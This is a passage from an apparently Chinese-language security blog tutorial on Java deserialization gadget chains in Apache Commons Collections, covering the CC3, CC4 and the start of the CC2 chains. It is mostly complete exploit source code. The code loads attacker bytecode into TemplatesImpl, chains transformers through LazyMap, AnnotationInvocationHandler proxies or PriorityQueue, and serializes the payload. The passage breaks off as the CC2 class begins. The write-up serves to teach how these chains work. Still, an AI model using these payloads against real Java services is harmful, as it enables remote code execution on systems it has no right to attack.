    <span class="n">annotationInvocationhdlConstructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
    <span class="n">InvocationHandler</span> <span class="n">h</span> <span class="o">=</span> <span class="o">(</span><span class="n">InvocationHandler</span><span class="o">)</span> <span class="n">annotationInvocationhdlConstructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Target</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Lazymap</span><span class="o">);</span>
<span class="c1">//动态代理</span>
    <span class="n">Map</span> <span class="n">mapProxy</span> <span class="o">=</span> <span class="o">(</span><span class="n">Map</span><span class="o">)</span> <span class="n">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="n">LazyMap</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">(),</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="n">h</span><span class="o">);</span>
    <span class="n">Object</span> <span class="n">o</span> <span class="o">=</span> <span class="n">annotationInvocationhdlConstructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Override</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">mapProxy</span><span class="o">);</span>

<span class="c1">//    serialize(o);</span>
    <span class="n">unserialize</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">);</span>
    <span class="o">}</span>


    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">serialize</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
        <span class="n">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">));</span>
        <span class="n">oos</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Object</span> <span class="nf">unserialize</span><span class="o">(</span><span class="n">String</span> <span class="n">Filename</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span><span class="n">ClassNotFoundException</span><span class="o">{</span>
        <span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="n">Filename</span><span class="o">));</span>
        <span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
        <span class="k">return</span> <span class="n">obj</span><span class="o">;</span>
    <span class="o">}</span>

<span class="o">}</span>
</pre></div>
<h3 data-content="1" id="12c5e952698069c2059576b1d821c444">EXP(CC3绕过过滤)：</h3>
<p>我们可以发现如果被禁用了InvokerTransformer的话，CC哪条链都无法执行，这样的话我们就考虑能否不使用他来构造链子，于是就想找到一个不使用InvokerTransformer里面反射调用的方法，找到一个可以直接调用Templateslmpl的newTransformer的类：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230712235505-77e9b3c2-20cc-1.png"/></p>
<p>所以CC3链子的作者找到了这样的一个类<code>TrAXFliter</code>（不存在序列化接口），可以直接调用newTransformer的类：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230712235512-7c848a1a-20cc-1.png"/></p>
<p>通过chainedTransformer类中的transform方法，先传入TrAXFilter.class，然后在通过InstantiateTransformer（存在序列化接口）的transform方法，对上面类和类的构造方法进行调用并将<code>TemplatesImpl Templates = new TemplatesImpl();</code>传入，触发TrAXFliter构造方法中的Templates.newInstance()方法。</p>
<div class="highlight"><pre><span></span><span class="n">Transformer</span><span class="o">[]</span> <span class="n">Transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">TrAXFilter</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
                <span class="k">new</span> <span class="n">InstantiateTransformer</span><span class="o">(</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="n">Templates</span><span class="o">})</span>

        <span class="o">};</span>
        <span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">Transformers</span><span class="o">);</span>
<span class="c1">//        chainedTransformer.transform(1);</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230712235523-8305db28-20cc-1.png"/></p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">EXP</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.Transformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InstantiateTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="o">;</span>


<span class="kn">import</span> <span class="nn">javax.xml.transform.Templates</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>


<span class="kn">import</span> <span class="nn">java.lang.annotation.Target</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Constructor</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.InvocationHandler</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Proxy</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.nio.file.Files</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.nio.file.Paths</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">CC3InstantiateTransformer</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>

        <span class="n">TemplatesImpl</span> <span class="n">Templates</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>
        <span class="c1">//_name赋值，否则代码return中止</span>
        <span class="n">Class</span> <span class="n">tc</span> <span class="o">=</span> <span class="n">Templates</span><span class="o">.</span><span class="na">getClass</span><span class="o">();</span>
        <span class="n">Field</span> <span class="n">nameField</span> <span class="o">=</span> <span class="n">tc</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_name"</span><span class="o">);</span>
        <span class="n">nameField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">nameField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">Templates</span><span class="o">,</span><span class="s">"aaa"</span><span class="o">);</span>
        <span class="c1">//private byte[][] _bytecodes = null;如果为null，报出异常；</span>
        <span class="c1">//同时满足这个loader.defineClass(_bytecodes[i]);</span>
        <span class="c1">//Class defineClass(final byte[] b) {</span>
        <span class="c1">//            return defineClass(null, b, 0, b.length);</span>
        <span class="c1">//        }</span>
        <span class="n">Field</span> <span class="n">bytecodeField</span> <span class="o">=</span> <span class="n">tc</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_bytecodes"</span><span class="o">);</span>
        <span class="n">bytecodeField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="c1">//一维数组满足defineClass参数从而命令执行</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">code</span> <span class="o">=</span> <span class="n">Files</span><span class="o">.</span><span class="na">readAllBytes</span><span class="o">(</span><span class="n">Paths</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"D://Tomcat/CC/target/classes/EXP/Demo.class"</span><span class="o">));</span>
        <span class="c1">//二维数组满足：</span>
        <span class="c1">// private byte[][] _bytecodes = null;如果为null，报出异常；</span>
        <span class="c1">//同时满足这个loader.defineClass(_bytecodes[i]);</span>
        <span class="kt">byte</span><span class="o">[][]</span> <span class="n">codes</span> <span class="o">=</span> <span class="o">{</span><span class="n">code</span><span class="o">};</span>
        <span class="n">bytecodeField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">Templates</span><span class="o">,</span><span class="n">codes</span><span class="o">);</span>
<span class="c1">//    避免_tfactory为空指针而报错</span>
<span class="c1">//    TemplatesImpl.TransletClassLoader loader = (TemplatesImpl.TransletClassLoader)</span>
<span class="c1">//            AccessController.doPrivileged(new PrivilegedAction() {</span>
<span class="c1">//                public Object run() {</span>
<span class="c1">//                    return new TemplatesImpl.TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span>
<span class="c1">//                }</span>
<span class="c1">//            });</span>
        <span class="n">Field</span> <span class="n">tfactoryField</span> <span class="o">=</span> <span class="n">tc</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_tfactory"</span><span class="o">);</span>
        <span class="n">tfactoryField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">tfactoryField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">Templates</span><span class="o">,</span><span class="k">new</span> <span class="n">TransformerFactoryImpl</span><span class="o">());</span>

<span class="c1">//        templates.newTransformer();</span>
<span class="c1">//        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{Templates});</span>
<span class="c1">//        instantiateTransformer.transform(TrAXFilter.class);//类不能序列化，class可以</span>
        <span class="n">Transformer</span><span class="o">[]</span> <span class="n">Transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">TrAXFilter</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
                <span class="k">new</span> <span class="n">InstantiateTransformer</span><span class="o">(</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="n">Templates</span><span class="o">})</span>

        <span class="o">};</span>
        <span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">Transformers</span><span class="o">);</span>
<span class="c1">//        chainedTransformer.transform(1);</span>


        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
        <span class="n">Map</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">Lazymap</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">map</span><span class="o">,</span><span class="n">chainedTransformer</span><span class="o">);</span>


        <span class="n">Class</span> <span class="n">c</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="o">);</span>
        <span class="n">Constructor</span> <span class="n">annotationInvocationhdlConstructor</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="n">annotationInvocationhdlConstructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">InvocationHandler</span> <span class="n">h</span> <span class="o">=</span> <span class="o">(</span><span class="n">InvocationHandler</span><span class="o">)</span> <span class="n">annotationInvocationhdlConstructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Target</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Lazymap</span><span class="o">);</span>
<span class="c1">//动态代理</span>
        <span class="n">Map</span> <span class="n">mapProxy</span> <span class="o">=</span> <span class="o">(</span><span class="n">Map</span><span class="o">)</span> <span class="n">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="n">LazyMap</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">(),</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="n">h</span><span class="o">);</span>
        <span class="n">Object</span> <span class="n">o</span> <span class="o">=</span> <span class="n">annotationInvocationhdlConstructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Override</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">mapProxy</span><span class="o">);</span>


        <span class="n">serialize</span><span class="o">(</span><span class="n">o</span><span class="o">);</span>
<span class="c1">//        unserialize("ser.bin");</span>
    <span class="o">}</span>




    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">serialize</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
        <span class="n">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">));</span>
        <span class="n">oos</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Object</span> <span class="nf">unserialize</span><span class="o">(</span><span class="n">String</span> <span class="n">Filename</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span><span class="n">ClassNotFoundException</span><span class="o">{</span>
        <span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="n">Filename</span><span class="o">));</span>
        <span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
        <span class="k">return</span> <span class="n">obj</span><span class="o">;</span>
    <span class="o">}</span>

<span class="o">}</span>
</pre></div>
<p>这就是现在所有的调用链流程图：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230712235539-8c791026-20cc-1.png"/></p>
<h2 data-content="1" id="5f4bfa288d5cb1da313fe0491fa3a24a">CommonsCollections4：</h2>
<p>在CC4的<code>commons-collections</code>版本当中，后续我们提到的利用类<code>TransformingComparator</code>中在CC3版本里并没有提供<code>serializeable</code>接口，而在CC4.0版本当中对接口进行了添加，所以我们就得到了CC4的反序列化利用链，因为还是在CC链当中，所以也是两种利用方式，命令执行和恶意类加载的代码执行，所以这里我们还是通过<code>transform</code>来寻找调用链，依然是两个要求：可以序列化，调用了transform方法，然后我们就找到了<code>TransformingComparator</code>类中的compare方法，并且compare方法还非常常见：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230712235548-91e7b634-20cc-1.png"/></p>
<p>然后我们就需要找其他类中readObject方法中是否能够调用compare方法，于是我们找到了PriorityQueue类中的<code>heapify() - &gt; siftDown - &gt; siftDownUsingComparator</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230712235553-94f03d06-20cc-1.png"/></p>
<h3 data-content="1" id="575631406a7aaa6bf1c539a82edf75ca">EXP问题:</h3>
<p>在我们简单调用完上面的链子之后，并没能够弹出计算器，所以这里我们就要下断点调试一下，size默认值为0，进不了循环</p>
<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kt">void</span> <span class="nf">heapify</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="o">(</span><span class="n">size</span> <span class="o">&gt;&gt;&gt;</span> <span class="mi">1</span><span class="o">)</span> <span class="o">-</span> <span class="mi">1</span><span class="o">;</span> <span class="n">i</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span><span class="o">--)</span>
            <span class="n">siftDown</span><span class="o">(</span><span class="n">i</span><span class="o">,</span> <span class="o">(</span><span class="n">E</span><span class="o">)</span> <span class="n">queue</span><span class="o">[</span><span class="n">i</span><span class="o">]);</span>
    <span class="o">}</span>
</pre></div>
<p>需要将size值为2才可以，又因为add函数在序列化时也能够走通链子，所以我们也和前面构造exp一样，先破坏一个值，然后再add以后使用反射修改回来：</p>
<h3 data-content="1" id="e440090ef3fecf204b908155a7aea386">EXP(CC4TransformingComparator):</h3>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">EXP</span><span class="o">;</span>


<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections4.comparators.TransformingComparator</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections4.Transformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections4.functors.ChainedTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections4.functors.ConstantTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections4.functors.*</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections4.functors.InstantiateTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections4.map.LazyMap</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">javax.xml.transform.Templates</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.annotation.Target</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Constructor</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.InvocationHandler</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Proxy</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.nio.file.Files</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.nio.file.Paths</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.PriorityQueue</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">CC4TransformingComparator</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>

        <span class="n">TemplatesImpl</span> <span class="n">Templates</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>
        <span class="c1">//_name赋值，否则代码return中止</span>
        <span class="n">Class</span> <span class="n">tc</span> <span class="o">=</span> <span class="n">Templates</span><span class="o">.</span><span class="na">getClass</span><span class="o">();</span>
        <span class="n">Field</span> <span class="n">nameField</span> <span class="o">=</span> <span class="n">tc</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_name"</span><span class="o">);</span>
        <span class="n">nameField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">nameField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">Templates</span><span class="o">,</span><span class="s">"aaa"</span><span class="o">);</span>
        <span class="c1">//private byte[][] _bytecodes = null;如果为null，报出异常；</span>
        <span class="c1">//同时满足这个loader.defineClass(_bytecodes[i]);</span>
        <span class="c1">//Class defineClass(final byte[] b) {</span>
        <span class="c1">//            return defineClass(null, b, 0, b.length);</span>
        <span class="c1">//        }</span>
        <span class="n">Field</span> <span class="n">bytecodeField</span> <span class="o">=</span> <span class="n">tc</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_bytecodes"</span><span class="o">);</span>
        <span class="n">bytecodeField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="c1">//一维数组满足defineClass参数从而命令执行</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">code</span> <span class="o">=</span> <span class="n">Files</span><span class="o">.</span><span class="na">readAllBytes</span><span class="o">(</span><span class="n">Paths</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"D://Tomcat/CC/target/classes/EXP/Demo.class"</span><span class="o">));</span>
        <span class="c1">//二维数组满足：</span>
        <span class="c1">// private byte[][] _bytecodes = null;如果为null，报出异常；</span>
        <span class="c1">//同时满足这个loader.defineClass(_bytecodes[i]);</span>
        <span class="kt">byte</span><span class="o">[][]</span> <span class="n">codes</span> <span class="o">=</span> <span class="o">{</span><span class="n">code</span><span class="o">};</span>
        <span class="n">bytecodeField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">Templates</span><span class="o">,</span><span class="n">codes</span><span class="o">);</span>
<span class="c1">//    避免_tfactory为空指针而报错</span>
<span class="c1">//    TemplatesImpl.TransletClassLoader loader = (TemplatesImpl.TransletClassLoader)</span>
<span class="c1">//            AccessController.doPrivileged(new PrivilegedAction() {</span>
<span class="c1">//                public Object run() {</span>
<span class="c1">//                    return new TemplatesImpl.TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span>
<span class="c1">//                }</span>
<span class="c1">//            });</span>
<span class="c1">//        Field tfactoryField = tc.getDeclaredField("_tfactory");</span>
<span class="c1">//        tfactoryField.setAccessible(true);</span>
<span class="c1">//        tfactoryField.set(Templates,new TransformerFactoryImpl());</span>
<span class="c1">//        Templates.newTransformer();</span>

        <span class="n">InstantiateTransformer</span> <span class="n">instantiateTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InstantiateTransformer</span><span class="o">(</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="n">Templates</span><span class="o">});</span>
<span class="c1">//        instantiateTransformer.transform(TrAXFilter.class);//类不能序列化，class可以</span>
        <span class="n">Transformer</span><span class="o">[]</span> <span class="n">Transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">TrAXFilter</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
                <span class="n">instantiateTransformer</span>

        <span class="o">};</span>

        <span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">Transformers</span><span class="o">);</span>

        <span class="n">TransformingComparator</span> <span class="n">transformingComparator</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TransformingComparator</span><span class="o">(</span><span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">&lt;&gt;(</span><span class="mi">1</span><span class="o">));</span>

        <span class="n">PriorityQueue</span> <span class="n">priorityQueue</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PriorityQueue</span><span class="o">&lt;&gt;(</span><span class="n">transformingComparator</span><span class="o">);</span>
        <span class="c1">//size长度要加2</span>
        <span class="n">priorityQueue</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span>
        <span class="n">priorityQueue</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span>

        <span class="n">Class</span> <span class="n">c</span> <span class="o">=</span> <span class="n">transformingComparator</span><span class="o">.</span><span class="na">getClass</span><span class="o">();</span>
        <span class="n">Field</span> <span class="n">transformedField</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"transformer"</span><span class="o">);</span>
        <span class="n">transformedField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">transformedField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">transformingComparator</span><span class="o">,</span><span class="n">chainedTransformer</span><span class="o">);</span>

<span class="c1">//        serialize(priorityQueue);</span>
        <span class="n">unserialize</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">);</span>
    <span class="o">}</span>


    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">serialize</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
        <span class="n">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">));</span>
        <span class="n">oos</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Object</span> <span class="nf">unserialize</span><span class="o">(</span><span class="n">String</span> <span class="n">Filename</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span><span class="n">ClassNotFoundException</span><span class="o">{</span>
        <span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="n">Filename</span><span class="o">));</span>
        <span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
        <span class="k">return</span> <span class="n">obj</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<h2 data-content="1" id="17ae02dd2ece5f913505839b1beefe35">CommonsCollections2:</h2>
<p>不走<code>TrAXFilter.class</code>的路线，直接用<code>InvokerTransform</code>调用<code>newTransformer</code>，通过add来传入参数，不使用自定义数组<code>ConstantTransformer</code>了</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230712235607-9d53d390-20cc-1.png"/></p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">EXP</span><span class="o">;</span>


<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections4.comparators.TransformingComparator</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections4.functors.ConstantTransformer</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.apache.commons.collections4.functors.*</span><span class="o">;</span>


<span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.nio.file.Files</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.nio.file.Paths</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.PriorityQueue</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">CC2</span> <span class="o">{</span>
